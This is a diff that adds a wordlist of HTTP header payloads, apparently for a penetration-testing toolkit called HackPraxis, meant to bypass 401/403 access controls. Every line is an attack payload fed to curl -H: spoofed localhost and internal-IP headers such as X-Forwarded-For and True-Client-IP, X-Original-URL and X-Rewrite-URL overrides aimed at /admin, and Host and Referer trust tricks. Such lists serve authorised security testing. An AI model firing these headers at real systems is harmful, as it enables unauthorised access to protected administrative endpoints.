@@ -1,0 +1,62 @@
+# HackPraxis 401/403 header bypass wordlist
+# Each non-comment line is a full HTTP header injected verbatim with: curl -H "<line>"
+# Edit the URL-rewrite values (X-Original-URL / X-Rewrite-URL) to your endpoint.
+# Sources: HackTricks, PortSwigger, PayloadsAllTheThings, Vidoc Security.
+#
+# --- Spoofed source-IP headers (back-end trusts a "local"/"internal" client) ---
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 0.0.0.0
+X-Forwarded-For: 127.0.0.1:80
+X-Forwarded-For: 127.0.0.1:443
+X-Forwarded-For: 192.168.0.1
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 172.16.0.1
+X-Forwarded-For: ::1
+X-Forwarded-For: 2130706433
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded: for=127.0.0.1
+Forwarded: for=localhost
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Host: localhost
+X-Forwarded-Server: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Originating-IP: ::1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Client-IP: localhost
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Real-IP: localhost
+X-ProxyUser-Ip: 127.0.0.1
+X-Host: 127.0.0.1
+X-Host: localhost
+X-Custom-IP-Authorization: 127.0.0.1
+X-Custom-IP-Authorization: localhost
+Via: 127.0.0.1
+#
+# --- URL-rewrite / override headers (request an allowed path, point these at the protected one) ---
+# Change /admin to the endpoint you are testing.
+X-Original-URL: /admin
+X-Original-URL: /
+X-Rewrite-URL: /admin
+X-Rewrite-URL: /
+X-Override-URL: /admin
+X-HTTP-DestinationURL: /admin
+#
+# --- Host / routing confusion ---
+Host: localhost
+X-Forwarded-Scheme: http
+X-Forwarded-Proto: http
+#
+# --- Referer / origin trust ---
+Referer: https://127.0.0.1/
+Referer: http://localhost/
+#
+# --- Content/UA tweaks occasionally tied to allow-lists ---
+User-Agent: Mozilla/5.0
+Content-Length: 0
